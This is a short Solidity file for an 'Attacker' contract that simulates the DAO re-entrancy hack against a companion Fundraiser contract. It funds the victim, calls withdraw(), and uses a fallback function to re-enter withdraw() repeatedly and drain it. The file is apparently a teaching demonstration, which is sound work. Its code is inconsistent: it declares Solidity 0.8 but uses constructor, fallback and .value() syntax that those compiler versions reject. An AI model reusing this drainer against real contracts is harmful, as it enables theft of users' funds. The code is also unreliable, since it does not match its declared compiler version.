/// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "./Fundraiser.sol";

/// @title DAO Hack Attacker contract - simulates re-entrancy attack.

contract Attacker{
    
    /* views */
    address public fundraiserAddress;
    uint public drainTimes = 0;
    
    /* Public functions */
    /// @dev Captures address of the victim contract.
    /// @param victimAddress address of victim contract on blockchain.
    function Attacker(address victimAddress) public 
    {
        fundraiserAddress = victimAddress;
    }

    /// @dev Fallback function draining the victim contract.
    function() external payable
    {
        if(drainTimes<3){
            drainTimes++;
            Fundraiser(fundraiserAddress).withdraw();
        }
    }
    
    /// @dev Getter function for balance of attacker contract.
    function getFunds() public returns (uint)
    {
        return address(this).balance;
    }

    /// @dev Calling the victim's contract contribute() method for funding.
    function payMe() public payable
    {
        Fundraiser(fundraiserAddress).contribute.value(msg.value)();
    }

    /// @dev Calling the victim's contract withdraw() method to start the scam.
    function startScam() public
    {
        Fundraiser(fundraiserAddress).withdraw();
    }
}